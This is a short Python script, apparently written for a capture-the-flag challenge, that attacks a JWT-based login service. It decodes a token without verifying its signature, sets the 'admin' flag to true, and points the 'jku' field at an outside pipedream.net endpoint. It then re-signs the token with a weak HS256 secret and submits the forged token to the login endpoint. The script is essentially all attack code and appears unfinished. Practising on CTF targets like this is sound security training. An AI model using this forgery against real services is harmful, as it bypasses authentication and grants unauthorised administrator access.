import requests
import jwt


BASE_URI = 'http://spooktoberctf.se:22081'

JWKS_PATH = f'{BASE_URI}/jwks'
TOKEN_PATH = f'{BASE_URI}/token'
LOGIN_PATH = f'{BASE_URI}/login'

def normal_flow():
    pubkey = requests.get(JWKS_PATH).json()['keys'][0]
    token_string = requests.get(TOKEN_PATH, {'admin': True}).json()['token']

    #with open('token', mode='w') as h:
    #    h.write(token_string)

    decoded_token = jwt.decode(token_string, options={"verify_signature": False})

    payload = decoded_token.copy()
    payload['admin'] = True
    payload['jku'] = 'https://eoc8pvuz3mzrajb.m.pipedream.net'

    # jwt.encode()

    evul = jwt.encode(payload, 'secret', algorithm='HS256')


    login = requests.post(LOGIN_PATH, json={'jwt': evul})
    print()



normal_flow()
